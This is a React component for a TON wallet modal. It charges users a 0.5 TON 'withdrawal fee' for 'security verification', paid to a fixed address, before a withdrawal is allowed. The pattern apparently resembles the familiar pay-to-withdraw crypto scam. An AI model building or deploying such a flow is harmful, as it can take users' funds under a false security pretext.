import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { supabase } from '@/integrations/supabase/client';
import { toast } from 'sonner';
import { Loader2, X } from 'lucide-react';
import { useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';
import { getValidUntil, tonToNano } from '@/lib/ton-constants';

interface WalletVerificationModalProps {
  open: boolean;
  onClose: () => void;
  userId: string;
  walletAddress: string;
  onVerified: () => void;
}

const VERIFICATION_FEE = 0.5; // TON
const VERIFICATION_WALLET = 'UQCFrjvfMxqHh4-tooMa22uNvbKGd73KfGab3cePjZxq_uNb';

const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
  open,
  onClose,
  userId,
  walletAddress,
  onVerified,
}) => {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [isLoading, setIsLoading] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [showImage, setShowImage] = useState(true);

  // Reset state when modal opens
  useEffect(() => {
    if (open) {
      setIsVerified(false);
      setShowImage(true);
    }
  }, [open]);

  const handleVerify = async () => {
    // Check if wallet is connected
    if (!wallet?.account) {
      toast.error('Please connect your wallet first');
      return;
    }

    if (!tonConnectUI.connected) {
      toast.error('Wallet not connected');
      return;
    }

    setIsLoading(true);
    
    try {
      console.log('Starting wallet verification transaction...');
      console.log('Destination:', VERIFICATION_WALLET);
      console.log('Amount:', VERIFICATION_FEE, 'TON');
      
      // Create TON transaction using consistent helpers
      const transaction = {
        validUntil: getValidUntil(),
        messages: [
          {
            address: VERIFICATION_WALLET,
            amount: tonToNano(VERIFICATION_FEE)
          }
        ]
      };

      console.log('Transaction object:', JSON.stringify(transaction, null, 2));
      
      // Send transaction
      const result = await tonConnectUI.sendTransaction(transaction);
      
      console.log('Transaction result:', result);
      
      if (result && result.boc) {
        // Record verification in database
        const { error } = await supabase
          .from('wallet_verifications')
          .insert({
            user_id: userId,
            wallet_address: walletAddress,
            currency: 'TON',
            verification_fee: VERIFICATION_FEE,
            tx_hash: result.boc,
            verified_at: new Date().toISOString(),
          });

        if (error) {
          console.error('Wallet verification insert error:', error);
          throw error;
        }

        setIsVerified(true);
        toast.success('Wallet verified successfully!');
        
        setTimeout(() => {
          onVerified();
          onClose();
        }, 1500);
      } else {
        throw new Error('No transaction result received');
      }
    } catch (error: any) {
      console.error('Verification error:', error);
      
      if (error?.message?.includes('Cancelled') || error?.message?.includes('cancelled') || error?.message?.includes('User declined')) {
        toast.error('Transaction cancelled');
      } else {
        toast.error(`Verification failed: ${error?.message || 'Unknown error'}`);
      }
    } finally {
      setIsLoading(false);
    }
  };

  const handleClose = () => {
    if (!isLoading) {
      onClose();
    }
  };

  return (
    <Dialog open={open} onOpenChange={handleClose}>
      <DialogContent className="max-w-sm border-0 bg-background p-0 gap-0" hideCloseButton>
        <AnimatePresence mode="wait">
          {isVerified ? (
            <motion.div
              key="verified"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="py-10 text-center px-6"
            >
              <p className="text-lg font-semibold text-green-500 mb-1">✓ Verified</p>
              <p className="text-sm text-muted-foreground">
                You can now withdraw
              </p>
            </motion.div>
          ) : (
            <motion.div
              key="form"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="flex flex-col"
            >
              {/* Security Image */}
              <div className="relative">
                <img 
                  src="/images/withdrawal-security.png" 
                  alt="Withdrawal Security" 
                  className="w-full h-auto rounded-t-lg"
                />
                <button 
                  onClick={handleClose} 
                  className="absolute top-2 right-2 p-1.5 rounded-full bg-black/50 text-white"
                  disabled={isLoading}
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Content */}
              <div className="p-5 space-y-4">
                <div className="text-center space-y-1">
                  <p className="text-lg font-bold text-foreground">
                    Withdrawal Fee
                  </p>
                  <p className="text-3xl font-bold text-primary">
                    {VERIFICATION_FEE} TON
                  </p>
                  <p className="text-xs text-muted-foreground">
                    Required for security verification
                  </p>
                </div>

                {/* Verify Button */}
                <Button
                  onClick={handleVerify}
                  disabled={isLoading || !wallet?.account}
                  className="w-full h-12 bg-primary hover:bg-primary/90 text-primary-foreground font-semibold"
                >
                  {isLoading ? (
                    <>
                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                      Processing...
                    </>
                  ) : !wallet?.account ? (
                    'Connect wallet first'
                  ) : (
                    'Pay & Withdraw'
                  )}
                </Button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </DialogContent>
    </Dialog>
  );
};

export default WalletVerificationModal;
